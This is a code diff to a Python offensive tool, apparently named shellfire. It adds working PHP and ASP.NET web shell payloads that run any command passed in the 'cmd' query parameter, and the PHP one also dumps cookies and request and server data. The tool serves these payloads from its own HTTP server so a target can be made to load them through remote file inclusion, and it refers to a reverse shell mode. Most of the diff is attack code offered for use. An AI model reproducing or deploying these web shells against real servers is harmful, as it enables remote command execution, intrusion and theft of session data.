@@ -18,11 +18,54 @@ import time
 ############################################################
 ## Configs
 
-version = "0.1"
+version = "0.2"
 url = "http://www.example.com?"
 history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
 post_data = {}
 cookies = {}
+payload = ""
+payload_type = "PHP"
+
+############################################################
+## Payloads
+
+def payload_aspnet():
+  global payload
+  global payload_type
+  payload = """\
+--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--<%
+Dim objShell = Server.CreateObject("WSCRIPT.SHELL")
+Dim command = Request.QueryString("cmd")
+
+Dim comspec = objShell.ExpandEnvironmentStrings("%comspec%")
+
+Dim objExec = objShell.Exec(comspec & " /c " & command)
+Dim output = objExec.StdOut.ReadAll()
+%><%= output %>--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--
+"""
+  payload_type = "ASP.NET"
+
+def payload_php():
+  global payload
+  global payload_type
+  payload = """\
+--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--<?php
+if ($_GET['cmd'] == '_show_phpinfo') {
+  phpinfo();
+} else if ($_GET['cmd'] == '_show_cookie') {
+  var_dump($_COOKIE);
+} else if ($_GET['cmd'] == '_show_get') {
+  var_dump($_GET);
+} else if ($_GET['cmd'] == '_show_post') {
+  var_dump($_POST);
+} else if ($_GET['cmd'] == '_show_server') {
+  var_dump($_SERVER);
+} else {
+  system($_GET['cmd']) || print `{$_GET['cmd']}`;
+}
+?>--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--
+"""
+  payload_type = "PHP"
 
 ############################################################
 ## Functions
@@ -40,6 +83,11 @@ def show_help(cmd=None):
     sys.stdout.write(".history nosave - do not write history file\n")
     sys.stdout.write(".history save - write history file on exit\n")
   elif cmd == "http":
+    sys.stdout.write(".http - show status of HTTP server\n")
+    sys.stdout.write(".http payload [type] - set the payload to be used for RFI\n")
+    sys.stdout.write("                       supported payload types:\n")
+    sys.stdout.write("                       aspnet\n")
+    sys.stdout.write("                       php\n")
     sys.stdout.write(".http start [port] - start HTTP server\n")
     sys.stdout.write(".http stop - stop HTTP server\n")
   elif cmd == "method":
@@ -83,25 +131,8 @@ def http_server(port):
         conn, addr = sock.accept()
       request = conn.recv(1024)
 
-      http_response = """\
-HTTP/1.1 200 OK
+      http_response = "HTTP/1.1 200 OK\n\n" + payload
 
---9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--<?php
-if ($_GET['cmd'] == '_show_phpinfo') {
-  phpinfo();
-} else if ($_GET['cmd'] == '_show_cookie') {
-  var_dump($_COOKIE);
-} else if ($_GET['cmd'] == '_show_get') {
-  var_dump($_GET);
-} else if ($_GET['cmd'] == '_show_post') {
-  var_dump($_POST);
-} else if ($_GET['cmd'] == '_show_server') {
-  var_dump($_SERVER);
-} else {
-  system($_GET['cmd']) || print `{$_GET['cmd']}`;
-}
-?>--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--
-"""
       conn.sendall(http_response)
       conn.close()
       conn = None
@@ -162,6 +193,9 @@ if os.path.isfile(history_file):
   except:
     pass
 
+## set initial payload for PHP
+payload_php()
+
 ## main loop
 while True:
   while revshell_running:
@@ -218,9 +252,10 @@ while True:
   elif cmd[0] == ".http":
     if len(cmd) == 1:
       if http_running == True:
-        sys.stdout.write("[*] HTTP Server listening on %s\n" % port)
+        sys.stdout.write("[*] HTTP server listening on %s\n" % port)
+        sys.stdout.write("[*] HTTP payload: %s\n" % payload_type)
       else:
-        sys.stdout.write("[*] HTTP Server is not running\n")
+        sys.stdout.write("[*] HTTP server is not running\n")
       continue
     if cmd[1] == "start":
       if http_running == False:
@@ -231,15 +266,24 @@ while True:
           port = 8888
         s = threading.Thread(target=http_server, args=(port,))
         s.start()
-        sys.stdout.write("[*] HTTP Server listening on %s\n" % port)
+        sys.stdout.write("[*] HTTP server listening on %s\n" % port)
       else:
-        sys.stdout.write("[!] HTTP Server already running\n")
+        sys.stdout.write("[!] HTTP server already running\n")
     elif cmd[1] == "stop":
       if http_running == True:
         http_running = False
         time.sleep(1)
       else:
-        sys.stdout.write("[!] HTTP Server already stopped\n")
+        sys.stdout.write("[!] HTTP server already stopped\n")
+    elif cmd[1] == "payload":
+      if cmd[2] == "aspnet":
+        payload_aspnet()
+      elif cmd[2] == "php":
+        payload_php()
+      else:
+        sys.stdout.write("[!] Unrecognized payload type\n")
+        continue
+      sys.stdout.write("[*] HTTP payload set: %s\n" % payload_type)
   elif cmd[0] == ".method":
     if len(cmd) > 2:
       sys.stdout.write("[!] Invalid parameters\n")
